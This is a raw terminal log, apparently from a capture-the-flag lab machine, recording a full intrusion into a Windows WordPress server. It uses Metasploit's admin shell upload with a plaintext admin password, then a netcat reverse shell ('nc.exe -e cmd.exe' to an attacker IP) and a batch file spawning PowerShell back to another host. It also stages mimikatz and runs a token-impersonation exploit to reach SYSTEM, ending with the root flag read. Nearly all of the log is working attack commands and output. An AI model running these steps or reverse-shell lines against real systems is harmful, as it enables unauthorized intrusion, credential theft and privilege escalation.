@@ -1,0 +1,130 @@
+msf exploit(unix/webapp/wp_admin_shell_upload) > run
+
+[*] Started reverse TCP handler on 10.10.14.243:4444 
+[*] Authenticating with WordPress using admin:P@s5w0rd!...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wordpress/wp-content/plugins/DIqvXhHENs/seCjATEiMs.php...
+[*] Sending stage (37543 bytes) to 10.10.10.29
+[*] Meterpreter session 2 opened (10.10.14.243:4444 -> 10.10.10.29:49883) at 2020-05-08 18:15:57 +0530
+[!] This exploit may require manual cleanup of 'seCjATEiMs.php' on the target
+[!] This exploit may require manual cleanup of 'DIqvXhHENs.php' on the target
+
+meterpreter > 
+[+] Deleted seCjATEiMs.php
+[+] Deleted DIqvXhHENs.php
+
+meterpreter > 
+meterpreter > cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
+meterpreter > dir
+Listing: C:\inetpub\wwwroot\wordpress\wp-content\uploads
+========================================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+100666/rw-rw-rw-  18093    fil   2020-02-10 16:37:10 +0530  black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+100666/rw-rw-rw-  20083    fil   2020-02-10 16:37:10 +0530  black-shield-shape-drawing-illustration-png-clip-art-273x300.png
+100666/rw-rw-rw-  254028   fil   2020-02-10 16:37:10 +0530  black-shield-shape-drawing-illustration-png-clip-art-768x844.png
+100666/rw-rw-rw-  11676    fil   2020-02-10 16:37:08 +0530  black-shield-shape-drawing-illustration-png-clip-art.png
+100666/rw-rw-rw-  23065    fil   2020-02-10 16:37:21 +0530  cropped-black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+100666/rw-rw-rw-  36889    fil   2020-02-10 16:37:21 +0530  cropped-black-shield-shape-drawing-illustration-png-clip-art.png
+100777/rwxrwxrwx  347648   fil   2020-05-09 01:03:42 +0530  js.exe
+100777/rwxrwxrwx  1005832  fil   2020-05-09 01:07:08 +0530  mimikatz.exe
+100777/rwxrwxrwx  38616    fil   2020-05-09 01:01:44 +0530  nc.exe
+100777/rwxrwxrwx  100      fil   2020-05-09 01:04:48 +0530  shell.bat
+
+meterpreter > cat shell.bat
+START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.114.134 1111 
+meterpreter > lcd /root/Downloads
+meterpreter > dir
+Listing: C:\inetpub\wwwroot\wordpress\wp-content\uploads
+========================================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+100666/rw-rw-rw-  18093    fil   2020-02-10 16:37:10 +0530  black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+100666/rw-rw-rw-  20083    fil   2020-02-10 16:37:10 +0530  black-shield-shape-drawing-illustration-png-clip-art-273x300.png
+100666/rw-rw-rw-  254028   fil   2020-02-10 16:37:10 +0530  black-shield-shape-drawing-illustration-png-clip-art-768x844.png
+100666/rw-rw-rw-  11676    fil   2020-02-10 16:37:08 +0530  black-shield-shape-drawing-illustration-png-clip-art.png
+100666/rw-rw-rw-  23065    fil   2020-02-10 16:37:21 +0530  cropped-black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+100666/rw-rw-rw-  36889    fil   2020-02-10 16:37:21 +0530  cropped-black-shield-shape-drawing-illustration-png-clip-art.png
+100777/rwxrwxrwx  347648   fil   2020-05-09 01:03:42 +0530  js.exe
+100666/rw-rw-rw-  29528    fil   2020-05-09 01:09:38 +0530  mimidrv.sys
+100777/rwxrwxrwx  1005832  fil   2020-05-09 01:07:08 +0530  mimikatz.exe
+100777/rwxrwxrwx  38616    fil   2020-05-09 01:01:44 +0530  nc.exe
+100777/rwxrwxrwx  100      fil   2020-05-09 01:04:48 +0530  shell.bat
+100777/rwxrwxrwx  97       fil   2020-05-09 01:10:13 +0530  shell2.bat
+
+meterpreter > execute -f nc.exe -a "-e cmd.exe 10.10.14.243 1234"
+Process 600 created.
+meterpreter > upload shell3.bat
+[*] uploading  : shell3.bat -> shell3.bat
+[*] uploaded   : shell3.bat -> shell3.bat
+meterpreter >
+
+
+##################################################
+
+┌─[root@parrot]─[~/Downloads]
+└──╼ #nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.29: inverse host lookup failed: Unknown host
+connect to [10.10.14.243] from (UNKNOWN) [10.10.10.29] 49888
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+Access is denied.
+
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell3.bat -l 1337 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}            
+js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell3.bat -l 1337 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}
+Testing {bb6df56b-cace-11dc-9992-0019b93a3a84} 1337
+......
+[+] authresult 0
+{bb6df56b-cace-11dc-9992-0019b93a3a84};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>C:\Users\Administrator\Desktop
+C:\Users\Administrator\Desktop
+Access is denied.
+
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>
+
+
+
+########################
+
+┌─[root@parrot]─[~/Downloads]
+└──╼ #nc -lvp 1111
+listening on [any] 1111 ...
+^C
+┌─[✗]─[root@parrot]─[~/Downloads]
+└──╼ #nc -lvp 6767
+listening on [any] 6767 ...
+10.10.10.29: inverse host lookup failed: Unknown host
+connect to [10.10.14.243] from (UNKNOWN) [10.10.10.29] 49902
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> cd  C:\Users\Administrator\Desktop
+cd  C:\Users\Administrator\Desktop
+PS C:\Users\Administrator\Desktop> dir
+dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-ar---        2/25/2020   1:28 PM             32 root.txt                      
+
+
+PS C:\Users\Administrator\Desktop> type root.txt
+type root.txt
+6e9a9fdc6f64e410a68b847bb4b404fa
+PS C:\Users\Administrator\Desktop> 
+
